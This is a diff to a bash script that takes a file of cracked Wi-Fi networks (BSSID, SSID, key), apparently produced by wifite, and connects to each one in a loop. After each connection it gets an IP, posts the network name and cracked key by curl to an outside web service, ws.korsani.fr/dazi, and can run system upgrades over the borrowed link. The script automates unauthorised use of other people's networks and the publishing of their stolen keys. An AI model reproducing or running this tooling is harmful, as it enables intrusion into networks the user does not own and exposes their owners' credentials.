@@ -1,28 +1,36 @@
 #!/bin/bash
-source /usr/local/include/libkoca.sh
+source $(dirname "$0")/libkoca.sh
 koca_lockMe -q /tmp/$(basename "$0").lock 2
 gotRoot || echo 'Must be run as root'
 t=$(mktemp)
 connect_fail=$(mktemp)
 if=wlan0
-trap " rm -f $t $connect_fail" 0
+trap "reset_if $if ; rm -f $t $connect_fail" 0
 cracked=$HOME/cracked.csv
-WS_EXPIRATION=10
+WS_EXPIRATION=36000
 function reset_if() {
 	local if=$1
 	dhclient -r $if
 	ifconfig $if 0.0.0.0
 	ifconfig $if down
+	iwconfig $if mode managed essid '' key off
 }
 function connect() {
 	ifconfig $if up
-	iw dev $if connect "$1" key 0:$2
+	ssid="$1"
+	key="$2"
+	bssid="$3"
+	iwconfig $if ap $bssid
+	iwconfig $if key $key
+	if [ -n $ssid ]
+	then
+		iwconfig $if essid "$ssid"
+	fi
 	for i in $(seq 0 10 100)
 	do
-		iwconfig $if | grep -q "ESSID:\"$1\"" && return 0
-		#iwconfig $if accespoints
+		#iwconfig $if | grep -q "ESSID:\"$1\"" && return 0
+		iw $if link | grep -q "SSID: $1" && return 0
 		sleep 1
-		#echo $i | dialog --gauge "$ssid" 8 40 0
 		koca_spin
 	done
 	echo
@@ -41,10 +49,16 @@ function wait_for_ip() {
 while [ "$1" != "" ]
 do
 	case $1 in
+		-h)
+			echo " -u		: udpate files when connected"
+			echo " -c <file>	: cracked file"
+			exit 0
+			;;
 		-u) export UPDATE_ME=yes;;
+		-c) export cracked=$2;shift;;
 	esac
+	shift
 done
-reset_if $if
 echo "Waiting $cracked"
 while [ ! -e $cracked ]
 do
@@ -52,26 +66,29 @@ do
 done
 while true
 do
-	echo 'Waiting...'
-	for line in $(cat $cracked)
+	reset_if $if
+	echo -n -e "\r                                                      "
+	echo -n -e "\rWaiting  "
+	koca_spin
+	for line in $(tac $cracked)
 	do
 		bssid=$(echo $line | cut -d ',' -f 1)
 		ssid=$(echo $line | cut -d ',' -f 3)
 		key=$(echo $line | cut -d ',' -f 4)
-		#echo $ssid $key
-		if egrep -q "^$ssid$" $t
+		if egrep -q "^$bssid$" $t
 		then
-			#echo "$ssid already done"
-			sleep 10
+			#echo -n "$ssid : connection tested"
+			sleep 3 
 			continue
 		fi
-		if egrep -q "^$ssid$" $connect_fail
+		if egrep -q "^$bssid$" $connect_fail
 		then
-			sleep 10
+			#echo -n "$ssid : connection was failed"
+			sleep 3
 			continue
 		fi
-		echo -n "Authenticating to $ssid  "
-		if connect $ssid $key $bssid
+		echo -n -e  "\rAuthenticating to $ssid ($bssid)  "
+		if connect "$ssid" "$key" "$bssid"
 		then
 			echo 'ok'
 			dhclient -1 $if
@@ -81,19 +98,19 @@ do
 			#route add default gw 192.168.0.254
 			echo -n 'Publication ... '
 			curl -s "ws.korsani.fr/dazi/?_method=patch&expiration=$WS_EXPIRATION" -d wifi=$ssid > /dev/null 
-			curl -s ws.korsani.fr/dazi/?expiration=$WS_EXPIRATION -d $ssid=$key > /dev/null && echo 'ok' && echo $ssid >> $t
+			curl -s ws.korsani.fr/dazi/?expiration=$WS_EXPIRATION -d $ssid=$key > /dev/null && echo 'ok' && echo $bssid >> $t
 			geoiplookup $(curl -s ws.korsani.fr/myip)
 			if [ -n "$UPDATE_ME" ]
 			then
 				echo 'Updating myself'
 				apt-get update > /dev/null
 				apt-get -y upgrade > /dev/null
-				$HOME/bin/wifite.py --update >/dev/null
+				#$HOME/bin/wifite.py --update >/dev/null
 			fi
 			reset_if $if
 		else
 			echo 'failed'
-			echo $ssid >> $connect_fail
+			echo $bssid >> $connect_fail
 		fi
 	done
 done
